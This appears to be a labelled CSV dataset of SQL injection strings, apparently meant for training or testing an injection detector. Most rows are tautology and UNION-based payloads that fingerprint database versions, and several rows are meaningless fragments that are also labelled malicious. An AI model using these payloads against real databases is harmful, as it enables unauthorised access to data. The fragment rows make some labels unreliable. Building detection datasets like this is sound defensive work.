text,label
"select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'",1
"select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",1
select * from users where id = '1' or \<$ or 1 = 1 -- 1',1
"select * from users where id = '1' or \<$ union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' or \<  = 1 union select 1,@@VERSION -- 1'",1
select * from users where id = '1' or !<@ or 1 = 1 -- 1',1
"select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'",1
"select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'",1
"select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'",1
"select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'",1
"select * from users where id = 1 or "" (  ) "" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ( ;"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#"" (  union select 1,version (  )  -- 1",1
"select * from users where id = 1 or 1#"" (  union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 or 1#"" (  union select 'a',version (  )  -- 1",1
"select * from users where id = 1 or 1#"" (  union select null,version (  )  -- 1",1
"select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ( ["" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1",1
"select * from users where id = 1 or @#"" (  = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or @#"" (  = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" )  ( "" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",1
s,1
"select * from users where id = 1 or "" ) ;"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ) ["" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ) $"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ) {"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",1
"select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or "",."" or 1 = 1 -- 1",1
s,1
"select * from users where id = 1 or "",;"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "",?"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#"", union select 1,version (  )  -- 1",1
"select * from users where id = 1 or 1#"", union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 or 1#"", union select 'a',version (  )  -- 1",1
"select * from users where id = 1 or 1#"", union select null,version (  )  -- 1",1
"select * from users where id = 1 or "",#"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#"", = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or @#"", = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or "",&"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",1
"select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1
"select * from users where id = 1 or "".,"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1",1
s,1
"select * from users where id = 1 or "".;"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "".]"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#"". union select 1,version (  )  -- 1",1
"select * from users where id = 1 or 1#"". union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1",1
"select * from users where id = 1 or 1#"". union select null,version (  )  -- 1",1
"select * from users where id = 1 or "".#"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "".["" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""._"" or 1 = 1 -- 1",1
"select * from users where id = 1 or @#"". = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#"". = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or "".%"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "".@"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or ""1 ) "" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""1,"" or 1 = 1 -- 1",1
s,1
"select * from users where id = 1 or ""1;"" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or ""1]"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or 1#""1 union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 or 1#""1 union select 'a',version (  )  -- 1",1
"select * from users where id = 1 or 1#""1 union select null,version (  )  -- 1",1
"select * from users where id = 1 or ""1#"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""1["" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""1{"" or 1 = 1 -- 1",1
"select * from users where id = '1' or """"<@ union select 1,version (  )  -- 1'",1
&1c,1
 ( s,1
 ) s,1
",s",1
.s,1
1s,1
;s,1
?s,1
UE1,1
UEf,1
UEs,1
UEv,1
c,1
n,1
ns,1
os,1
s,1
v,1
{s,1
"select * from users where id = 1 or 1#""; or 1 = 1 -- 1",1
"select * from users where id = 1 or ""; ( "" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or "";."" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or "";1"" or 1 = 1 -- 1",1
s,1
"select * from users where id = 1 or "";]"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""; union select 1,version (  )  -- 1",1
"select * from users where id = 1 or 1#""; union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 or 1#""; union select 'a',version (  )  -- 1",1
"select * from users where id = 1 or 1#""; union select null,version (  )  -- 1",1
"select * from users where id = 1 or "";#"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "";["" or 1 = 1 -- 1",1
"select * from users where id = 1 or "";_"" or 1 = 1 -- 1",1
"select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""; = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or "";&"" or 1 = 1 -- 1",1
"select * from users where id = '1' union select "";""_,version (  )  -- 1'",1
"select * from users where id = 1 or "";@"" or 1 = 1 -- 1",1
"select * from users where id = 1 or "";{"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""? or 1 = 1 -- 1",1
"select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""] ) "" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",1
"select * from users where id = '1' union select $[""],@@VERSION -- 1'",1
"select * from users where id = 1 or ""]."" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",1
s,1
"select * from users where id = 1 or ""?;"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""??"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""? union select 1,version (  )  -- 1",1
"select * from users where id = 1 or 1#""? union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 or 1#""? union select 'a',version (  )  -- 1",1
"select * from users where id = 1 or 1#""? union select null,version (  )  -- 1",1
"select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""?["" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""?_"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""? = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or ""?%"" or 1 = 1 -- 1",1
"select * from users where id = '1' union select ""?""_,version (  )  -- 1'",1
"select * from users where id = 1 or ""?@"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",1
"select * from users where id = '1' union select ||/1,version (  )  -- 1'",1
"select * from users where id = '1' union select  ( \ ) ,@@VERSION -- 1'",1
"select * from users where id = '1' union select  ( \. ) ,@@VERSION -- 1'",1
"select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'",1
"select * from users where id = '1' union select \,@@VERSION -- 1'",1
"select * from users where id = '1' union select \.,@@VERSION -- 1'",1
"select * from users where id = '1' union select \.#,@@VERSION -- 1'",1
"select * from users where id = '1' union select \.%1,@@VERSION -- 1'",1
"select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'",1
"select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'",1
"select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",1
"select * from users where id = '1' union select \#,@@VERSION -- 1'",1
"select * from users where id = '1' union select $ .,@@VERSION -- 1'",1
"select * from users where id = '1' union select $ _,@@VERSION -- 1'",1
"select * from users where id = '1' union select $*$,@@VERSION -- 1'",1
"select * from users where id = '1' union select +\,@@VERSION -- 1'",1
"select * from users where id = '1' union select +\.,@@VERSION -- 1'",1
"select * from users where id = '1' union select !<1,version (  )  -- 1'",1
"select * from users where id = '1' union select +\#,@@VERSION -- 1'",1
"select * from users where id = '1' union select !<@,version (  )  -- 1'",1
"select * from users where id = '1' union select @ 1,version (  )  --  1'",1
"select * from users where id = '1'   union select null,banner from v$version where rownum = 1 -- 1'",1
"select * from users where id = '1' union select @ @1,version (  )  --  1'",1
"select * from users where id = 1 or ""\#"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1",1
"select * from users where id = '1' union select ""[""_,version (  )  -- 1'",1
s,1
"select * from users where id = 1 or ""_;"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""$ union select 1,version (  )  -- 1",1
"select * from users where id = 1 or 1#""$ union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 or 1#""$ union select 'a',version (  )  -- 1",1
"select * from users where id = 1 or 1#""$ union select null,version (  )  -- 1",1
"select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""$@"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""_{"" or 1 = 1 -- 1",1
select * from users where id = '1' * ( \ )  or 1 = 1 -- 1',1
"select * from users where id = '1' +  ( \ )  union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' +  ( \. )  union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1'",1
"select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""& ) "" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""%,"" or 1 = 1 -- 1",1
select * from users where id = '1'<@.. or 1 = 1 -- 1',1
"select * from users where id = '1'<@.. union select 1,version (  )  -- 1'",1
select * from users where id = '1' <@.$ or 1 = 1 -- 1',1
"select * from users where id = '1' <@._ union select 1,version (  )  -- 1'",1
"select * from users where id = 1 or ""%."" or 1 = 1 -- 1",1
"select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'",1
"select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'",1
"select * from users where id = 1 or ""%1"" or 1 = 1 -- 1",1
s,1
"select * from users where id = 1 or ""%;"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",1
"select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'",1
select * from users where id = '1' *$ . or 1 = 1 -- 1',1
"select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'",1
select * from users where id = '1' *$ 1 or 1 = 1 -- 1',1
"select * from users where id = 1 or ""%["" or 1 = 1 -- 1",1
select * from users where id = '1' <@$_ or 1 = 1 -- 1',1
"select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'",1
"select * from users where id = 1 or ""%_"" or 1 = 1 -- 1",1
select * from users where id = '1' + $+%\ or 1 = 1 -- 1',1
select * from users where id = '1' <@&1 or 1 = 1 -- 1',1
"select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'",1
"select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'",1
select * from users where id = '1' + $+%$ or 1 = 1 -- 1',1
"select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'",1
"select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",1
select * from users where id = '1' <@&@ or 1 = 1 -- 1',1
"select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'",1
"select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'",1
"select * from users where id = '1' + @ ( 1 )  union select 1,version (  )  -- 1'",1
"select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'",1
"select * from users where id = '1' + @ 1! union select 1,version (  )  -- 1'",1
"select * from users where id = '1' + @ @1 union select 1,version (  )  -- 1'",1
"select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""@ ) "" or 1 = 1 -- 1",1
s,1
"select * from users where id = 1 or ""@;"" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or ""@?"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""@ union select 1,version (  )  -- 1",1
"select * from users where id = 1 or 1#""@ union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 or 1#""@ union select 'a',version (  )  -- 1",1
"select * from users where id = 1 or 1#""@ union select null,version (  )  -- 1",1
"select * from users where id = 1 or ""@#"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""@%"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or ""{ ) "" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""{,"" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or ""{."" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""{1"" = 1 or 1 = 1 -- 1",1
s,1
"select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""{?"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""{ union select 1,version (  )  -- 1",1
"select * from users where id = 1 or 1#""{ union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 or 1#""{ union select 'a',version (  )  -- 1",1
"select * from users where id = 1 or 1#""{ union select null,version (  )  -- 1",1
"select * from users where id = 1 or ""{#"" or 1 = 1 -- 1",1
"select * from users where id = 1 or @#""{ = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or @#""{ = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or ""{%"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""{@"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""{{"" or 1 = 1 -- 1",1
"select * from users where id = 1 + @`\` union select 1,version (  )  -- 1",1
"select * from users where id = 1 + @<1# union select 1,version (  )  -- 1",1
"select * from users where id = 1 + @<@. union select 1,version (  )  -- 1",1
"select * from users where id = 1 -@<@ union select 1,version (  )  -- 1",1
"select * from users where id = 1 -@<@ union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 -@<@ union select null,version (  )  -- 1",1
"select * from users where id = 1 + @<@# union select null,version (  )  -- 1",1
'-',1
' ',1
'&',1
'^',1
'*',1
' or ''-',1
' or '' ',1
' or ''&',1
' or ''^',1
' or ''*',1
"""-""",1
""" """,1
"""&""",1
"""^""",1
"""*""",1
""" or """"-""",1
""" or """" """,1
""" or """"&""",1
""" or """"^""",1
""" or """"*""",1
or true--,1
""" or true--",1
' or true--,1
""" )  or true--",1
' )  or true--,1
' or 'x' = 'x,1
' )  or  ( 'x' )  =  ( 'x,1
'  )  )   or   (  (  'x'  )  )   =   (  (  'x,1
""" or ""x"" = ""x",1
""" )  or  ( ""x"" )  =  ( ""x",1
"""  )  )   or   (  (  ""x""  )  )   =   (  (  ""x",1
or 1 = 1,1
